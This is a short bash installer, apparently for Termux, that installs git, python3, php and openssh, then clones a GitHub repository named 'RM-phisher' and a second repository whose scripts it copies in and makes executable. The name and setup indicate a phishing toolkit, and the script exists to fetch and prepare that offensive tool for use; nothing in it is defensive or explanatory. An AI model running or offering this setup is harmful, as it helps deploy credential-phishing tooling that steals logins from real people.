#!bin/bash

apt update -y
apt install git -y
apt install python3 -y
apt install php -y
apt install openssh -y
pkg update -y
pkg install git -y
pkg install python3 -y
pkg install php -y
pkg install openssh -y


git clone https://github.com/ritheshnayak/RM-phisher
cd RM-phisher
git clone https://github.com/EnzoGly/project0
cd project0
cp programa.py ..
cp executar.sh ..
cd ..
rm -rf project0
chmod +x *
cd RM-phisher
